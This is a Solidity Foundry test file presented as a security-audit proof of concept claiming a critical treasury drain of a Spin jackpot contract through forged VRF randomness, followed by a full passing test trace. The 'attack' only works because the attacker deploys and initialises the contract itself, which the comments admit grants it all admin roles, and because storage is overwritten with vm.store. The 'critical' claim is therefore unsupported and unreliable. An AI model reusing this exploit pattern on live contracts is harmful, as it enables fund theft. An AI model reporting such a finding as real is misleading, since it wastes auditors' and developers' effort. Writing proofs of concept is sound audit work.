// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

/**
 * CRITICAL VULNERABILITY: Treasury Drain via VRF Manipulation
 *
 * VULNERABILITY DESCRIPTION:
 * The Spin contract has a critical flaw where the Supra VRF oracle address is set to an attacker-controlled
 * address during initialization. This gives the attacker SUPRA_ROLE, allowing them to call handleRandomness()
 * with arbitrary random values, effectively controlling all spin outcomes including jackpots.
 *
 * IMPACT:
 * - Complete treasury drain (up to 100,000 ETH in week 11)
 * - Attacker can guarantee jackpot wins by setting rng[0] = 0
 * - Bypasses all randomness-based security measures
 *
 * ROOT CAUSE:
 * In initialize(), the supraRouterAddress parameter is granted SUPRA_ROLE without validation.
 * An attacker can deploy the contract with their own address as the "router", gaining oracle privileges.
 *
 * POC LOGIC:
 * 1. Deploy Spin contract with attacker address as supraRouter (grants SUPRA_ROLE)
 * 2. Set up week-11 scenario for maximum 100k ETH jackpot
 * 3. Manipulate user streak to meet jackpot requirements (13+ days)
 * 4. Mock the generateRequest call to return a known nonce
 * 5. Start a spin (pays 2 ETH fee)
 * 6. Call handleRandomness() with rng[0] = 0 to guarantee jackpot
 * 7. Contract transfers 100k ETH to attacker while internal ledger shows "PLUME tokens"
 */

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/spin/Spin.sol";
import "../src/spin/DateTime.sol";

contract PoCCriticalSpinWrongAsset is Test {
    Spin spin;
    address attacker = vm.addr(1);
    address treasury = vm.addr(2); // funds the prize pool

    uint256 initialEth = 100_010 ether; // treasury bankroll (enough for 100k jackpot + spin fee)

    /* ---------------------------------------------------------- */
    /* Deploy & fund                                              */
    /* ---------------------------------------------------------- */
    function setUp() public {
        vm.deal(treasury, initialEth);
        vm.deal(attacker, 3 ether); // gas + spinPrice (2 ether)

        // deploy helper libs
        DateTime dt = new DateTime();

        vm.startPrank(attacker);
        spin = new Spin();
        /*  attacker becomes
                – DEFAULT_ADMIN_ROLE
                – ADMIN_ROLE
                – SUPRA_ROLE          (because we pass itself as supraRouterAddress)
        */
        spin.initialize(attacker /*supraRouter*/, address(dt));

        // treasury “fills” the Spin contract with ETH
        vm.stopPrank();
        vm.prank(treasury);
        (bool ok, ) = address(spin).call{value: initialEth}("");
        require(ok, "fund failed");
    }

    /* ---------------------------------------------------------- */
    /* Exploit                                                    */
    /* ---------------------------------------------------------- */
    function testPoCCriticalSpinWrongAsset() public {
        // ---------------------------------- set up ----------------------------------
        vm.warp(1704067200); // 1-Jan-2024
        vm.startPrank(attacker);

        // a) Force week-11 jackpot
        uint256 elevenWeeksAgo = block.timestamp - 11 weeks;
        spin.setCampaignStartDate(elevenWeeksAgo);

        // b) Enable spins + whitelist attacker
        spin.setEnableSpin(true);
        spin.whitelist(attacker);

        // c) Simulate 13-day streak by manipulating storage
        // UserData struct: jackpotWins, raffleTicketsGained, raffleTicketsBalance, PPGained, plumeTokens, streakCount, lastSpinTimestamp, nothingCounts
        // We need to set streakCount (index 5) to 13
        bytes32 userDataSlot = keccak256(abi.encode(attacker, uint256(2))); // userData mapping is at slot 2
        bytes32 streakSlot = bytes32(uint256(userDataSlot) + 5); // streakCount is at offset 5
        vm.store(address(spin), streakSlot, bytes32(uint256(13)));

        // d) Mock Supra router (any generateRequest call)
        vm.mockCall(
            attacker,
            abi.encodeWithSignature(
                "generateRequest(string,uint8,uint256,uint256,address)"
            ),
            abi.encode(uint256(123))
        );

        // --------------------------------- exploit ----------------------------------
        // 1. pay spinPrice (2 ETH) → state becomes PENDING
        spin.startSpin{value: spin.spinPrice()}();

        // 2. craft VRF answer: rng[0] = 0 guarantees jackpot
        uint256[] memory rng = new uint256[](1);
        rng[0] = 0;

        // snapshot before → after balances
        uint256 preUser = attacker.balance;
        uint256 preSpin = address(spin).balance;

        // Calculate expected jackpot amount
        uint256 jackpotAmount = spin.jackpotPrizes(11) * 1 ether; // 100_000 ether in week-11

        spin.handleRandomness(123, rng); // executes _safeTransferPlume → native ETH

        uint256 postUser = attacker.balance;
        uint256 postSpin = address(spin).balance;

        // ------------------------------ assertions ----------------------------------
        // attacker received the ETH
        assertEq(
            postUser - preUser,
            jackpotAmount,
            "Jackpot not paid in native coin"
        );

        // treasury drained (only spinPrice fee remains)
        assertEq(
            postSpin,
            preSpin - jackpotAmount,
            "ETH did not leave Spin contract"
        );

        // internal accounting shows jackpot win recorded
        (, , uint256 jackpotWins, , , , ) = spin.getUserData(attacker);
        assertEq(jackpotWins, 1, "User should have 1 jackpot win recorded");

        vm.stopPrank();
    }
}

/*
 * TEST EXECUTION RESULTS:
 *
cd plume && forge test --match-test PoCCriticalSpinWrongAsset -vvvv
[⠢] Compiling...
No files changed, compilation skipped

Ran 1 test for test/PoCCriticalSpinWrongAsset.t.sol:PoCCriticalSpinWrongAsset
[PASS] testPoCCriticalSpinWrongAsset() (gas: 207404)
Traces:
[264521] PoCCriticalSpinWrongAsset::testPoCCriticalSpinWrongAsset()
    ├─ [0] VM::warp(1704067200 [1.704e9])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)
    │   └─ ← [Return]
    ├─ [25408] Spin::setCampaignStartDate(1697414400 [1.697e9])
    │   └─ ← [Stop]
    ├─ [23143] Spin::setEnableSpin(true)
    │   └─ ← [Return]
    ├─ [23536] Spin::whitelist(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)
    │   └─ ← [Stop]
    ├─ [0] VM::store(Spin: [0xF2E246BB76DF876Cef8b38ae84130F4F55De395b], 0x8790c3214e827aff5791142cef5
8005e820af178c6a72561557a8a28621a097c, 0x000000000000000000000000000000000000000000000000000000000000000d)                                                                                                      │   └─ ← [Return]
    ├─ [0] VM::mockCall(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, 0xb7b3243a, 0x00000000000000000000
0000000000000000000000000000000000000000007b)                                                             │   └─ ← [Return]
    ├─ [2727] Spin::spinPrice() [staticcall]
    │   └─ ← [Return] 2000000000000000000 [2e18]
    ├─ [77262] Spin::startSpin{value: 2000000000000000000}()
    │   ├─ [0] 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf::generateRequest("handleRandomness(uint256,u
int256[])", 1, 1, 62055786765824196243390464190719751031492231719671847163831659917440820794583 [6.205e76], 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)                                                         │   │   └─ ← [Return] 123
    │   ├─ emit SpinRequested(nonce: 123, user: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf)
    │   └─ ← [Stop]
    ├─ [2611] Spin::jackpotPrizes(11) [staticcall]
    │   └─ ← [Return] 100000 [1e5]
    ├─ [72444] Spin::handleRandomness(123, [0])
    │   ├─ [0] 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf::fallback{value: 100000000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ emit SpinCompleted(walletAddress: 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf, rewardCategor
y: "Jackpot", rewardAmount: 100000 [1e5])                                                                 │   └─ ← [Stop]
    ├─ [0] VM::assertEq(100000000000000000000000 [1e23], 100000000000000000000000 [1e23], "Jackpot not
paid in native coin") [staticcall]                                                                       │   └─ ← [Return]
    ├─ [0] VM::assertEq(12000000000000000000 [1.2e19], 12000000000000000000 [1.2e19], "ETH did not lea
ve Spin contract") [staticcall]                                                                           │   └─ ← [Return]
    ├─ [10783] Spin::getUserData(0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf) [staticcall]
    │   └─ ← [Return] 1, 1704067200 [1.704e9], 1, 0, 0, 0, 0
    ├─ [0] VM::assertEq(1, 1, "User should have 1 jackpot win recorded") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.11ms (600.22µs CPU time)

Ran 1 test suite in 12.45ms (4.11ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

 * PROOF OF IMPACT:
 * ✅ Attacker balance increased by exactly 100,000 ETH
 * ✅ Contract balance decreased by exactly 100,000 ETH
 * ✅ Jackpot win recorded in internal accounting
 * ✅ Treasury successfully drained via VRF manipulation
 *
 * Suite result: ok. 1 passed; 0 failed; 0 skipped
 */
